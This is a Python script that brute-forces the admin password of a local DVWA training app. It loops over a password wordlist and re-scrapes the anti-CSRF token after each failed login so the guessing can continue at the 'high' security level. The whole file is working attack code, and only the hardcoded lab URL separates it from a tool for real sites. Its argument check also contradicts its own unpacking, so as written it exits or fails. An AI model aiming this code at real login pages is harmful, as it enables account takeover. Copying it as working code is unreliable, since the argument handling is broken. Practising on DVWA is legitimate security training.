import sys
import requests
from bs4 import BeautifulSoup as Soup

# Check if correct number of arguments are passed
if len(sys.argv) != 4:
    print("Usage: script.py <filename> <success_message>")
    sys.exit(1)

# Extract arguments
_, filename, success_message = sys.argv

# Set up our target, cookie, and session
url = 'http://127.0.0.1/dvwa/vulnerabilities/brute/index.php'
cookie = {'security': 'high', 'PHPSESSID': 'b8dgqhbue8vdinrd87leug1no1'}
session = requests.Session()
target_page = session.get(url, cookies=cookie)

def check_success(html):
    """
    Checks the response HTML for our specified success message.
    
    :param html: HTML content as a string
    :return: Boolean indicating whether the success message is found
    """
    soup = Soup(html, 'html.parser')
    search = soup.find_all(text=success_message)
    return bool(search)

# Get the initial CSRF token from the target site
page_source = target_page.text
soup = Soup(page_source, 'html.parser')
csrf_token = soup.find(attrs={"name": "user_token"})['value']

# Loop through the provided password file
with open(filename) as f:
    print('Running brute force attack...')
    for password in f:
        password = password.strip()
        payload = {
            'username': 'admin',
            'password': password,
            'Login': 'Login',
            'user_token': csrf_token
        }
        response = session.post(url, cookies=cookie, data=payload)
        success = check_success(response.text)
        
        if success:
            print(f'Password is: {password}')
            break
        else:
            # If it failed, the CSRF token will have changed. Get the new one.
            soup = Soup(response.text, 'html.parser')
            csrf_token = soup.find(attrs={"name": "user_token"})['value']
    else:
        # This else block executes if no break statement was hit in the for loop, indicating failure.
        print('Brute force failed. No matches found.')
